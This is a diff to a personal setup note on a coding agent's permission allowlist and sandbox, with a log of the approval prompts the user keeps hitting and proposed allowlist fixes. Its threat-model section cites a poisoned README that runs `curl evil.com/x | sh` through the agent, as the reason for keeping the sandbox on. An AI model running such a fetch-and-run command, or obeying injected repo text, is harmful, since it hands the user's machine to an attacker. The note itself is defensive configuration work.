@@ -47,9 +47,9 @@ Add canonical command shapes to `permissions.allow`. Patterns are glob-ish — w
       "Bash(pnpm build*)",
       "Bash(pnpm dlx *)",
       "Bash(node *)",
-      "Bash(bun *)"
-    ]
-  }
+      "Bash(bun *)",
+    ],
+  },
 }
 ```
 
@@ -137,3 +137,207 @@ Denying `WebFetch` doesn't stop `Bash(curl ...)`. Other-domain curl falls throug
 - Sandbox section: `.claude/settings.json` → `sandbox`
 - Threat model: `CLAUDE.md` → "Threat model"
 - Exa MCP config: `.mcp.json`
+
+## Interruptions still encountered
+
+Below is a list of examples of the multiple user prompts i'm getting during sessions.
+
+### Root causes & fixes
+
+Observed prompts cluster into six causes. Each has a distinct fix — allowlist alone won't catch all of them.
+
+#### 1. Compound commands (`A && B`)
+
+Allowlist patterns match a single command shape. `sleep 5 && curl -sS http://localhost:3000` is a compound — neither `Bash(sleep *)` nor `Bash(curl -sS http://localhost:*)` matches it as a unit.
+
+Fix: add explicit compound shapes for recurring combinations.
+
+```jsonc
+"allow": [
+  "Bash(sleep * && curl -sS http://localhost:*)",
+  "Bash(sleep * && curl -s http://localhost:*)",
+  "Bash(git log:* && git rev-parse:*)",
+]
+```
+
+#### 2. Pipes (`A | B | C`)
+
+Allowlist matches the first command; downstream pipe stages (`jq`, `head`, `awk`, `sort`) get re-checked.
+
+Fix: allow common pipe-tail tools too.
+
+```jsonc
+"allow": [
+  "Bash(jq:*)",
+  "Bash(awk:*)",
+  "Bash(sed:*)",
+  "Bash(head:*)",
+  "Bash(tail:*)",
+  "Bash(sort:*)",
+  "Bash(grep:*)",
+  "Bash(rg:*)",
+]
+```
+
+#### 3. Read-only git verbs blocked by sandbox
+
+"Sandbox blocks git. Retry outside sandbox." appears for `git log`, `git show`, `git rev-parse`, `git rev-list`. These are read-only but the sandbox flags them because git can write to `.git/` (index lock, pack refresh).
+
+Fix: allowlist read-only verbs explicitly.
+
+```jsonc
+"allow": [
+  "Bash(git log:*)",
+  "Bash(git show:*)",
+  "Bash(git rev-parse:*)",
+  "Bash(git rev-list:*)",
+  "Bash(git diff:*)",
+  "Bash(git blame:*)",
+  "Bash(git status)",
+  "Bash(git status:*)",
+]
+```
+
+#### 4. Reads outside cwd
+
+`awk ... ~/code/ma≥rumwelt/...` or `Read(~/.claude/plugins/cache/...)` — sandbox confines reads to the current working directory by default. Plugin/skill files live in `~/.claude/plugins/`, outside any project cwd.
+
+Fix: add absolute-path Read globs to **user-level** `~/.claude/settings.json` (so they apply across projects).
+
+```jsonc
+"allow": [
+  "Read(//home/<user>/.claude/plugins/**)",
+  "Read(//home/<user>/.claude/skills/**)",
+]
+```
+
+Note the leading `//` — Claude Code's permission system requires absolute paths to start with `//`, not `/`.
+
+#### 5. Backslash-escaped paths
+
+`~/code/marumwelt/prototype/Portfolio\ v3.html` — glob matching can't unescape backslashes. The same path with quotes (`"Portfolio v3.html"`) matches normally.
+
+Fix: standardize in `CLAUDE.md` — always quote paths with spaces, never backslash-escape.
+
+#### 6. Build commands writing outside cwd
+
+"Sandbox blocks build. Retry without sandbox." — likely `pnpm build` writing to `~/.cache/`, `~/.pnpm-store/`, or similar. Not an allowlist problem; sandbox is correctly blocking writes outside cwd.
+
+Fix options:
+
+- Set `PNPM_HOME` / cache dirs inside the project (`.pnpm-store/`)
+- Allow writes to specific external dirs in sandbox config (if your Claude Code version supports per-path write allowlisting)
+- Accept the prompt for builds — they're infrequent
+
+### Should I just disable the sandbox?
+
+Tempting given the friction, but no — not as a default. The threat model (CLAUDE.md → "Threat model") is **prompt injection in untrusted repo content** issuing shell commands via the agent. Tailscale/UFW guard inbound; the sandbox guards agent-induced outbound execution. Disabling it removes the only layer that contains a poisoned README running `curl evil.com/x | sh`.
+
+Defensible middle path: **per-project opt-out via `.claude/settings.local.json`** in trusted-only repos:
+
+```jsonc
+{ "sandbox": { "enabled": false } }
+```
+
+Keep sandbox on globally for the untrusted-repo-review use case. Fix the allowlist gaps above to cut friction on trusted work instead.
+
+### Interruptions recorded
+
+Bash
+
+```
+ git show ec84082:package.json | jq '.devDependencies | to_entries[] | select(.key | test("vitest|@vitejs/plugin-react|@testing-library/react|@testing-library/jest-dom|@testing-library/user-event|jsdom")) | "\(.key): \(.value)"'
+```
+
+`git show d705666:package.json | jq '.devDependencies.oxlint'`
+
+---
+
+Read
+
+```
+~/.claude/plugins/cache/claude-plugins-official/superpowers/5.1.0/skills/subagent-driven-development/spec-reviewer-prompt.md
+```
+
+---
+
+Sandbox blocks git. Retry outside sandbox.
+
+---
+
+Bash command (unsandboxed)
+`git log --oneline -n 2 && git rev-parse e6e79af^`
+
+---
+
+Bash command (unsandboxed)
+
+```
+awk 'length > 100 {print FILENAME ":" NR ": " length " chars: " $0}' ~/code/marumwelt/components/nav/FixedNav.tsx ~/code/marumwelt/app/layout.tsx
+```
+
+---
+
+Bash
+`sleep 5 && curl -sS http://localhost:3000 | head -50`
+
+---
+
+```
+Read(~/.claude/plugins/cache/claude-plugins-official/superpowers/5.1.0/skills/subagent-driven-development/code-quality-reviewer-prompt.md)
+```
+
+2. Yes, allow reading from subagent-driven-development/ during this session
+
+---
+
+Sandbox blocks build. Retry without sandbox.
+
+---
+
+`git rev-list -n 1 v0.1.0-foundation && git log -1 --oneline v0.1.0-foundation^`
+
+---
+
+Bash
+
+```
+find . -type f \( -name "*.md" -o -name "package.json" \) ! -path "*/node_modules/*" ! -path "*/archive/*" | sort
+Run shell command
+```
+
+---
+
+Bash
+
+```
+grep -i "d-fast\|d-base\|d-slow" ~/code/marumwelt/prototype/Portfolio\ v3.html 2>/dev/null | head -5
+Run shell command
+```
+
+Contains backslash-escaped whitespace
+
+---
+
+```
+Read(~/.claude/plugins/cache/claude-plugins-official/superpowers/5.1.0/skills/subagent-driven-development/implementer-prompt.md)
+```
+2.  Yes, allow reading from subagent-driven-development/ during this session
+
+---
+
+ Bash
+```
+test -f .env.local && echo "env exists" || echo "MISSING"; git status --short && git log --oneline main..HEAD
+```
+
+### Settings
+
+Current settings to audit
+
+`~/.claude/settings.json`
+`~/.claude/settings.local.json`
+
+and in the specific project i'm working in
+`~/code/marumwelt/.claude/settings.json`
+`~/code/marumwelt/.claude/settings.local.json`
